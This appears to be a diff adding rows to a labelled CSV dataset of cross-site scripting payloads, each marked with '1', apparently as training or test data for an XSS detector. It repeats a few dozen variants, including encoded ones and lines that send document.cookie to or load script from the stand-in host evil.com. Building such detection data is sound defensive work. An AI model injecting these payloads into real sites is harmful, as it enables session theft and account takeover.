+<svg/onload=alert(1)>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<details ontoggle=alert(1) open>,1
+<body onload=alert(1)>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<video onloadstart=alert(1) src=x>,1
+<body onload=alert(1)>,1
+<details ontoggle=alert(1) open>,1
+<svg/onload=alert(1)>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<img src=x onerror=alert(1)>,1
+<select onchange=alert(1)><option>x</option></select>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<script>alert(document.cookie)</script>,1
+<details ontoggle=alert(1) open>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<img src=x onerror=alert(document.cookie)>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<details ontoggle=alert(1) open>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<details ontoggle=alert(1) open>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<img src=x onerror=alert(document.cookie)>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<input onfocus=alert(1) autofocus>,1
+<input onfocus=alert(1) autofocus>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<script src='http://evil.com/xss.js'></script>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<svg/onload=alert(1)>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<script>alert(1)</script>,1
+<script>alert(1)</script>,1
+<img src=x onerror=alert(1)>,1
+<a href='javascript:alert(1)'>click</a>,1
+<script src='http://evil.com/xss.js'></script>,1
+<img src=x onerror=alert(document.cookie)>,1
+<img src=x onerror=alert(1)>,1
+<script src='http://evil.com/xss.js'></script>,1
+<input onfocus=alert(1) autofocus>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<details ontoggle=alert(1) open>,1
+<input onfocus=alert(1) autofocus>,1
+<iframe src='javascript:alert(1)'>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<iframe src='javascript:alert(1)'>,1
+<img src=x onerror=alert(1)>,1
+<iframe src='javascript:alert(1)'>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<body onload=alert(1)>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<script>alert(1)</script>,1
+<details ontoggle=alert(1) open>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<a href='javascript:alert(1)'>click</a>,1
+<script>alert(1)</script>,1
+<select onchange=alert(1)><option>x</option></select>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<script src='http://evil.com/xss.js'></script>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<script src='http://evil.com/xss.js'></script>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<svg/onload=alert(1)>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<select onchange=alert(1)><option>x</option></select>,1
+<iframe src='javascript:alert(1)'>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<iframe src='javascript:alert(1)'>,1
+<a href='javascript:alert(1)'>click</a>,1
+<img src=x onerror=alert(1)>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<svg/onload=alert(1)>,1
+<a href='javascript:alert(1)'>click</a>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<svg/onload=alert(1)>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<input onfocus=alert(1) autofocus>,1
+<svg/onload=alert(1)>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<body onload=alert(1)>,1
+<details ontoggle=alert(1) open>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<video onloadstart=alert(1) src=x>,1
+<script>alert(1)</script>,1
+<script src='http://evil.com/xss.js'></script>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<script>alert(document.cookie)</script>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<script src='http://evil.com/xss.js'></script>,1
+<details ontoggle=alert(1) open>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<script src='http://evil.com/xss.js'></script>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<iframe src='javascript:alert(1)'>,1
+<script>alert(document.cookie)</script>,1
+<video onloadstart=alert(1) src=x>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<img src=x onerror=alert(1)>,1
+<video onloadstart=alert(1) src=x>,1
+<details ontoggle=alert(1) open>,1
+<iframe src='javascript:alert(1)'>,1
+<script src='http://evil.com/xss.js'></script>,1
+<script>alert(document.cookie)</script>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<a href='javascript:alert(1)'>click</a>,1
+<script>alert(document.cookie)</script>,1
+<input onfocus=alert(1) autofocus>,1
+<script>alert(1)</script>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<body onload=alert(1)>,1
+<img src=x onerror=alert(document.cookie)>,1
+<script>alert(1)</script>,1
+<a href='javascript:alert(1)'>click</a>,1
+<iframe src='javascript:alert(1)'>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<script src='http://evil.com/xss.js'></script>,1
+<video onloadstart=alert(1) src=x>,1
+<details ontoggle=alert(1) open>,1
+<svg/onload=alert(1)>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<script>alert(1)</script>,1
+<img src=x onerror=alert(document.cookie)>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<script>alert(1)</script>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<video onloadstart=alert(1) src=x>,1
+<a href='javascript:alert(1)'>click</a>,1
+<img src=x onerror=alert(document.cookie)>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<a href='javascript:alert(1)'>click</a>,1
+<script>alert(1)</script>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<input onfocus=alert(1) autofocus>,1
+<script>alert(document.cookie)</script>,1
+<details ontoggle=alert(1) open>,1
+<script>alert(1)</script>,1
+<script src='http://evil.com/xss.js'></script>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<script>alert(1)</script>,1
+<a href='javascript:alert(1)'>click</a>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<script src='http://evil.com/xss.js'></script>,1
+<img src=x onerror=alert(1)>,1
+<body onload=alert(1)>,1
+<script src='http://evil.com/xss.js'></script>,1
+<input onfocus=alert(1) autofocus>,1
+<img src=x onerror=alert(document.cookie)>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<details ontoggle=alert(1) open>,1
+<svg/onload=alert(1)>,1
+<body onload=alert(1)>,1
+<script>alert(document.cookie)</script>,1
+<video onloadstart=alert(1) src=x>,1
+<img src=x onerror=alert(1)>,1
+<svg/onload=alert(1)>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<svg/onload=alert(1)>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<img src=x onerror=alert(document.cookie)>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<svg/onload=alert(1)>,1
+<img src=x onerror=alert(document.cookie)>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<svg/onload=alert(1)>,1
+<a href='javascript:alert(1)'>click</a>,1
+<video onloadstart=alert(1) src=x>,1
+<iframe src='javascript:alert(1)'>,1
+<svg/onload=alert(1)>,1
+<iframe src='javascript:alert(1)'>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<script src='http://evil.com/xss.js'></script>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<video onloadstart=alert(1) src=x>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<body onload=alert(1)>,1
+<svg/onload=alert(1)>,1
+<a href='javascript:alert(1)'>click</a>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<details ontoggle=alert(1) open>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<body onload=alert(1)>,1
+<img src=x onerror=alert(1)>,1
+<script src='http://evil.com/xss.js'></script>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<svg/onload=alert(1)>,1
+<input onfocus=alert(1) autofocus>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<iframe src='javascript:alert(1)'>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<img src=x onerror=alert(document.cookie)>,1
+<a href='javascript:alert(1)'>click</a>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<select onchange=alert(1)><option>x</option></select>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<script src='http://evil.com/xss.js'></script>,1
+<select onchange=alert(1)><option>x</option></select>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<a href='javascript:alert(1)'>click</a>,1
+<svg/onload=alert(1)>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<script src='http://evil.com/xss.js'></script>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<img src=x onerror=alert(document.cookie)>,1
+<body onload=alert(1)>,1
+<iframe src='javascript:alert(1)'>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<video onloadstart=alert(1) src=x>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<script>alert(1)</script>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<body onload=alert(1)>,1
+<svg/onload=alert(1)>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<script>alert(document.cookie)</script>,1
+<details ontoggle=alert(1) open>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<script>alert(1)</script>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<video onloadstart=alert(1) src=x>,1
+<video onloadstart=alert(1) src=x>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<input onfocus=alert(1) autofocus>,1
+<body onload=alert(1)>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<script src='http://evil.com/xss.js'></script>,1
+<img src=x onerror=alert(1)>,1
+<input onfocus=alert(1) autofocus>,1
+<script src='http://evil.com/xss.js'></script>,1
+<body onload=alert(1)>,1
+<video onloadstart=alert(1) src=x>,1
+<input onfocus=alert(1) autofocus>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<input onfocus=alert(1) autofocus>,1
+<script>alert(1)</script>,1
+<iframe src='javascript:alert(1)'>,1
+<video onloadstart=alert(1) src=x>,1
+<iframe src='javascript:alert(1)'>,1
+<img src=x onerror=alert(document.cookie)>,1
+<script>alert(1)</script>,1
+<iframe src='javascript:alert(1)'>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<body onload=alert(1)>,1
+<a href='javascript:alert(1)'>click</a>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<body onload=alert(1)>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<video onloadstart=alert(1) src=x>,1
+<details ontoggle=alert(1) open>,1
+<script src='http://evil.com/xss.js'></script>,1
+<a href='javascript:alert(1)'>click</a>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<video onloadstart=alert(1) src=x>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<video onloadstart=alert(1) src=x>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<svg/onload=alert(1)>,1
+<body onload=alert(1)>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<iframe src='javascript:alert(1)'>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<script>alert(document.cookie)</script>,1
+<details ontoggle=alert(1) open>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<body onload=alert(1)>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<img src=x onerror=alert(document.cookie)>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<details ontoggle=alert(1) open>,1
+<body onload=alert(1)>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<script>alert(document.cookie)</script>,1
+<script>alert(1)</script>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<video onloadstart=alert(1) src=x>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<body onload=alert(1)>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<input onfocus=alert(1) autofocus>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<img src=x onerror=alert(1)>,1
+<video onloadstart=alert(1) src=x>,1
+<img src=x onerror=alert(1)>,1
+<video onloadstart=alert(1) src=x>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<img src=x onerror=alert(document.cookie)>,1
+<img src=x onerror=alert(1)>,1
+<svg/onload=alert(1)>,1
+<img src=x onerror=alert(document.cookie)>,1
+<svg/onload=alert(1)>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<input onfocus=alert(1) autofocus>,1
+<img src=x onerror=alert(document.cookie)>,1
+<img src=x onerror=alert(1)>,1
+<a href='javascript:alert(1)'>click</a>,1
+<script>alert(1)</script>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<script src='http://evil.com/xss.js'></script>,1
+<img src=x onerror=alert(document.cookie)>,1
+<video onloadstart=alert(1) src=x>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<script>alert(1)</script>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<a href='javascript:alert(1)'>click</a>,1
+<img src=x onerror=alert(1)>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<body onload=alert(1)>,1
+<script>alert(document.cookie)</script>,1
+<video onloadstart=alert(1) src=x>,1
+<svg/onload=alert(1)>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<script>alert(document.cookie)</script>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<svg/onload=alert(1)>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<img src=x onerror=alert(document.cookie)>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<body onload=alert(1)>,1
+<iframe src='javascript:alert(1)'>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<input onfocus=alert(1) autofocus>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<details ontoggle=alert(1) open>,1
+<iframe src='javascript:alert(1)'>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<img src=x onerror=alert(1)>,1
+<video onloadstart=alert(1) src=x>,1
+<iframe src='javascript:alert(1)'>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<details ontoggle=alert(1) open>,1
+<a href='javascript:alert(1)'>click</a>,1
+<img src=x onerror=alert(document.cookie)>,1
+<body onload=alert(1)>,1
+<iframe src='javascript:alert(1)'>,1
+<img src=x onerror=alert(1)>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<iframe src='javascript:alert(1)'>,1
+<svg/onload=alert(1)>,1
+<details ontoggle=alert(1) open>,1
+<script src='http://evil.com/xss.js'></script>,1
+<input onfocus=alert(1) autofocus>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<select onchange=alert(1)><option>x</option></select>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<img src=x onerror=alert(document.cookie)>,1
+<svg/onload=alert(1)>,1
+<a href='javascript:alert(1)'>click</a>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<script>alert(1)</script>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<script src='http://evil.com/xss.js'></script>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<svg/onload=alert(1)>,1
+<script src='http://evil.com/xss.js'></script>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<iframe src='javascript:alert(1)'>,1
+<details ontoggle=alert(1) open>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<img src=x onerror=alert(document.cookie)>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<script>alert(1)</script>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<svg/onload=alert(1)>,1
+<script src='http://evil.com/xss.js'></script>,1
+<svg/onload=alert(1)>,1
+<input onfocus=alert(1) autofocus>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<svg/onload=alert(1)>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<script src='http://evil.com/xss.js'></script>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<img src=x onerror=alert(document.cookie)>,1
+<a href='javascript:alert(1)'>click</a>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<body onload=alert(1)>,1
+<img src=x onerror=alert(1)>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<svg/onload=alert(1)>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<svg/onload=alert(1)>,1
+<svg/onload=alert(1)>,1
+<a href='javascript:alert(1)'>click</a>,1
+<details ontoggle=alert(1) open>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<a href='javascript:alert(1)'>click</a>,1
+<script>alert(document.cookie)</script>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<iframe src='javascript:alert(1)'>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<img src=x onerror=alert(document.cookie)>,1
+<img src=x onerror=alert(1)>,1
+<details ontoggle=alert(1) open>,1
+<a href='javascript:alert(1)'>click</a>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<details ontoggle=alert(1) open>,1
+<img src=x onerror=alert(document.cookie)>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<details ontoggle=alert(1) open>,1
+<script src='http://evil.com/xss.js'></script>,1
+<a href='javascript:alert(1)'>click</a>,1
+<img src=x onerror=alert(1)>,1
+<script>alert(document.cookie)</script>,1
+<iframe src='javascript:alert(1)'>,1
+<img src=x onerror=alert(document.cookie)>,1
+<svg/onload=alert(1)>,1
+<script>alert(1)</script>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<input onfocus=alert(1) autofocus>,1
+<iframe src='javascript:alert(1)'>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<video onloadstart=alert(1) src=x>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<script src='http://evil.com/xss.js'></script>,1
+<body onload=alert(1)>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<img src=x onerror=alert(1)>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<video onloadstart=alert(1) src=x>,1
+<svg/onload=alert(1)>,1
+<details ontoggle=alert(1) open>,1
+<a href='javascript:alert(1)'>click</a>,1
+<video onloadstart=alert(1) src=x>,1
+<a href='javascript:alert(1)'>click</a>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<script>alert(1)</script>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<body onload=alert(1)>,1
+<iframe src='javascript:alert(1)'>,1
+<svg/onload=alert(1)>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<video onloadstart=alert(1) src=x>,1
+<iframe src='javascript:alert(1)'>,1
+<video onloadstart=alert(1) src=x>,1
+<details ontoggle=alert(1) open>,1
+<body onload=alert(1)>,1
+<video onloadstart=alert(1) src=x>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<select onchange=alert(1)><option>x</option></select>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<iframe src='javascript:alert(1)'>,1
+<details ontoggle=alert(1) open>,1
+<script>alert(1)</script>,1
+<a href='javascript:alert(1)'>click</a>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<script>alert(document.cookie)</script>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<video onloadstart=alert(1) src=x>,1
+<body onload=alert(1)>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<body onload=alert(1)>,1
+<script src='http://evil.com/xss.js'></script>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<svg/onload=alert(1)>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<script>alert(1)</script>,1
+<img src=x onerror=alert(1)>,1
+<img src=x onerror=alert(1)>,1
+<img src=x onerror=alert(1)>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<script src='http://evil.com/xss.js'></script>,1
+<input onfocus=alert(1) autofocus>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<script>alert(document.cookie)</script>,1
+<script>alert(1)</script>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<body onload=alert(1)>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<input onfocus=alert(1) autofocus>,1
+<script>alert(document.cookie)</script>,1
+<svg/onload=alert(1)>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<body onload=alert(1)>,1
+<script src='http://evil.com/xss.js'></script>,1
+<script src='http://evil.com/xss.js'></script>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<script>alert(document.cookie)</script>,1
+<img src=x onerror=alert(1)>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<iframe src='javascript:alert(1)'>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<details ontoggle=alert(1) open>,1
+<img src=x onerror=alert(document.cookie)>,1
+<body onload=alert(1)>,1
+<body onload=alert(1)>,1
+<svg/onload=alert(1)>,1
+<script>alert(document.cookie)</script>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<details ontoggle=alert(1) open>,1
+<script>alert(1)</script>,1
+<script>alert(document.cookie)</script>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<select onchange=alert(1)><option>x</option></select>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<select onchange=alert(1)><option>x</option></select>,1
+<details ontoggle=alert(1) open>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<input onfocus=alert(1) autofocus>,1
+<body onload=alert(1)>,1
+<input onfocus=alert(1) autofocus>,1
+<iframe src='javascript:alert(1)'>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<input onfocus=alert(1) autofocus>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<svg/onload=alert(1)>,1
+<script src='http://evil.com/xss.js'></script>,1
+<script>alert(1)</script>,1
+<script>alert(1)</script>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<video onloadstart=alert(1) src=x>,1
+<img src=x onerror=alert(document.cookie)>,1
+<script>alert(document.cookie)</script>,1
+<iframe src='javascript:alert(1)'>,1
+<img src=x onerror=alert(1)>,1
+<video onloadstart=alert(1) src=x>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<input onfocus=alert(1) autofocus>,1
+<details ontoggle=alert(1) open>,1
+<script src='http://evil.com/xss.js'></script>,1
+<img src=x onerror=alert(1)>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<script>alert(1)</script>,1
+<body onload=alert(1)>,1
+<body onload=alert(1)>,1
+<script>alert(document.cookie)</script>,1
